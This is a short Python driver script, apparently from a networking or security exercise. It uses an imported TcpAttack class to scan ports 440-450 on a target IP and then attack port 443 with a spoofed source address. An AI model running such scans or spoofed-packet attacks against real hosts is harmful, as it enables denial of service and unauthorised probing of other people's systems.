from TcpAttack import * 
# Will contain actual IP addresses in real script
spoofIP='172.16.20.125'; targetIP='128.46.4.92'
rangStart=440; rangeEnd=450; port=443
Tcp = TcpAttack(spoofIP,targetIP)
Tcp.scanTarget(rangStart, rangeEnd)
if Tcp.attackTarget(port,10):
    print('port was open to attack')